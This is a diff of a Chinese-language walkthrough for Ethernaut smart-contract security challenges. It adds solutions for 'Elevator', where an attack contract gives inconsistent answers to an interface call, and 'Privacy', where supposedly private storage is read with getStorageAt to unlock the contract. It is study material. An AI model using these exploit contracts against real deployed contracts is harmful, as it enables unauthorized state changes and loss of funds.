@@ -48,7 +48,7 @@ function dosome() public payable{
 2. 执行攻击合约的dosome函数
 3. 通关
 
-# King
+# 09 King
 这是一个Dos攻击（拒绝服务）型的漏洞
 先看代码：
 ```
@@ -101,7 +101,7 @@ contract AttackKing {
 ![](../images/ethernaut/e08/02.jpg)
 3. 通关
 
-## Re-Entrancy
+## 10 Re-Entrancy
 顾名思义，这是一个重入漏洞
 先看代码：
 ```
@@ -169,3 +169,98 @@ contract attack {
 ![](../images/ethernaut/e10/01.png)
 可以看到原合约已经没有token了。而我们的账户有了很多，攻击成功。
 ![](../images/ethernaut/e10/02.png)
+
+# 11 Elevator
+这道题其实考的是编程时的一个逻辑漏洞
+先看代码
+```
+pragma solidity ^0.6.0;
+
+interface Building {
+  function isLastFloor(uint) external returns (bool);
+}
+
+
+contract Elevator {
+  bool public top;
+  uint public floor;
+
+  function goTo(uint _floor) public {
+    Building building = Building(msg.sender);
+
+    if (! building.isLastFloor(_floor)) {
+      floor = _floor;
+      top = building.isLastFloor(floor);
+    }
+  }
+}
+```
+题目想要我们到达顶层，也就是把`top`变为true，但是我们明显能看到想要进入`goTo(uint)`中的判断条件，`building.isLastFloor(_floor)`就必须是`false`，`top`也等于这个值，乍一看想要`top=true`好像是个不可能的事。但由于`Building`是个接口，而`isLastFloor`则是一个抽象函数，这里`Building(msg.sender)`远程调用我们传入的合约，因此我们可以自己设计这个函数的具体内容。
+>其实在这里两次调用了` building.isLastFloor(floor)`，他们的返回值一定是一样的吗？既然我们可以自定义函数，我们就可以在函数里面做一些变动让判断条件在第二次调用时，返回相反的值。
+
+攻击合约：
+```
+pragma solidity ^0.6.0;
+
+interface Elevator {
+  function goTo(uint _floor) external;
+}
+
+contract MyBuilding{
+    uint temp = 5;
+    Elevator e;
+    function isLastFloor(uint i) external returns (bool){
+        if(temp == i){
+            temp = 6;
+            return false;
+        }else{
+            return true;
+        }
+    }
+
+    function dosome() public{
+        address adr = 0xd8b4056b73Cd9E7890a32548cEAd96D6116B52ae;//Elevator地址
+        e = Elevator(adr);
+        // adr.call(abi.encodeWithSignature("goTo(uint256)",5));
+        e.goTo(5);
+    }
+}
+```
+可以看到，在第一次调用之后我就把temp的值变了，那么第二次再进行判断时，就会返回true。
+
+* 解题步骤
+执行dosome()即可
+
+## 12 Privacy
+这个题和前面08 Vault几乎一样，实质就是告诉我们以太坊中的储存，就算是private修饰，他也是可以被访问到的，比如用web3脚本
+`web3.eth.getStorageAt()`就可以轻松访问到。
+先看代码
+```
+pragma solidity ^0.6.0;
+
+contract Privacy {
+
+  bool public locked = true;
+  uint256 public ID = block.timestamp;
+  uint8 private flattening = 10;
+  uint8 private denomination = 255;
+  uint16 private awkwardness = uint16(now);
+  bytes32[3] private data;
+
+  constructor(bytes32[3] memory _data) public {
+    data = _data;
+  }
+  
+  function unlock(bytes16 _key) public {
+    require(_key == bytes16(data[2]));
+    locked = false;
+  }
+}
+```
+我们只要获得key就可以通关，也就是合约中的`data`,
+直接获取即可。
+* 解题步骤
+  1. 用`web3.eth.getStorageAt('0xe1442525366a0cC8e2D25E480B0ACf47FE291Ecc',5)`得到data
+  ![](../images/ethernaut/e12/01.png)
+  2. 然后由于require中的判断是去前16个byte，去前32位执行unlock方法即可
+  ![](../images/ethernaut/e12/02.png)
